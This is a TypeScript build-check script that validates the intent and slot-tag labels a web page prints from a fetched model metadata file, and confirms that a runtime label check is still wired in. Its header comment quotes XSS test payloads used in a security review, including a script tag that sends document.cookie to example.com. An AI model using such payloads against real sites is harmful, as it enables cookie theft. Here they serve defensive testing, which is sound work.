/**
 * The 109 strings the page prints as its own answer, held to a shape.
 *
 *   npm run check:shape
 *
 * WS-F7, the supply chain pass of 22 September. `meta.json` is fetched at boot
 * from a directory the page is pointed at, and 44 intents and 65 BIO tags out
 * of it are printed as the page's verdict. The finding was that they reached
 * `innerHTML`, and that `tools/check-meta.mjs`, which reads exactly this file,
 * "validates parity tolerances, input hashes, obtainable flags,
 * measuredOn.runtime, rowsRead, rowsEvaluated and the shape of every latency
 * block. It says nothing about the content of intents or slotTags."
 *
 * The `innerHTML` half is gone: there is no `innerHTML` assignment left in
 * `src/`, none in the bundle, and the page builds those two labels with
 * `createElement` and `textContent`.
 *
 * The second half was still true, and this is what it cost. Measured at tick
 * 202 by writing `<img src=x onerror=alert(1)>` into the intent the test
 * sentence resolves to, and `B-ROOM"><script>fetch("//example.com/"+document.cookie)</script>`
 * into a tag:
 *
 *     no element created, 0 requests off origin, 0 CSP console lines
 *     the page printed the whole string as the winning intent's name
 *     all 23 build gates passed
 *
 * Not an injection, because `textContent` and the policy both hold. A page that
 * prints whatever a file it downloaded tells it to, as its own answer, with
 * nothing in the build that would notice.
 *
 * ## What is held, and where the shapes come from
 *
 * The shapes are imported from `src/lib/labels.ts`, which `router.ts`
 * uses to refuse the same strings at run time. One source, two reaches: this gate sees
 * the committed file, the runtime sees the fetched one, and a fork pointed at
 * somebody else's model directory only meets the second.
 *
 * The shapes were derived from the 109 strings that exist, not guessed. A first
 * attempt at the intents required a dot and failed on `oos` and `translate`,
 * and one at the tags required upper case and failed on 64 of 65.
 */

import { readFileSync } from 'node:fs'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { LABEL_FIELDS, LABEL_MAX } from '../src/lib/labels'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')

let failed = 0
const fail = (what: string, detail?: string) => {
  failed++
  console.error(`FAIL  ${what}`)
  if (detail) console.error(`      ${detail}`)
}

const meta = JSON.parse(readFileSync(resolve(root, 'public/model/meta.json'), 'utf8'))

for (const [field, shape, says] of LABEL_FIELDS) {
  const arr = meta[field]
  if (!Array.isArray(arr) || arr.length === 0) {
    fail(`meta.json has no ${field}`, `These are ${says}.`)
    continue
  }
  const bad = arr
    .map((v: unknown, i: number) => ({ i, v }))
    .filter(({ v }) => typeof v !== 'string' || (v as string).length > LABEL_MAX || !shape.test(v as string))
  if (bad.length > 0) {
    fail(
      `${bad.length} of ${arr.length} ${field} are not labels this page should print`,
      `first: ${field}[${bad[0].i}] = ${JSON.stringify(String(bad[0].v).slice(0, 70))}, against ${shape}`,
    )
  } else {
    const longest = Math.max(...arr.map((v: string) => v.length))
    console.log(`  ok      ${arr.length} ${field} match ${shape}, longest ${longest} of ${LABEL_MAX}`)
  }
}

/*
 * And the runtime check is still wired to both load paths.
 *
 * The gate above reads the committed file, which is the half that cannot go
 * wrong on its own. The reach that matters is the fetched one, and it is three
 * lines of `checkLabels(...)` in two places that a refactor would not miss on
 * purpose. This is a grep, deliberately: the alternative is driving a browser
 * against a hostile fixture, and `check:degraded` already owns the failure path.
 */
const router = readFileSync(resolve(root, 'src/lib/router.ts'), 'utf8')
const guarded = /const meta = checkLabels\(\(await metaRes\.json\(\)\) as Meta\)/.test(router)
const describeOnly = /return \(await res\.json\(\)\) as Meta/.test(router)
if (!guarded) {
  fail(
    'the parse in Router.load is not wrapped in checkLabels',
    'That is the one that hands the page the strings it prints. A shape nothing applies is a comment.',
  )
} else if (!describeOnly) {
  fail(
    'Router.loadMeta refuses labels as well, and it should not',
    'It exists to describe the page before the graph arrives, and everything it prints is a count. ' +
      'Refusing there threw the description away too and left an empty standfirst, which is WH-F5.',
  )
} else {
  console.log('  ok      the printing parse is guarded and the describing one is left alone')
}

if (failed > 0) {
  console.error('\nThe page prints these strings as its own answer. Nothing else in the build reads them.')
  process.exit(1)
}

console.log('shape: the 109 labels the page prints are labels, in the committed file and at the moment it is fetched')
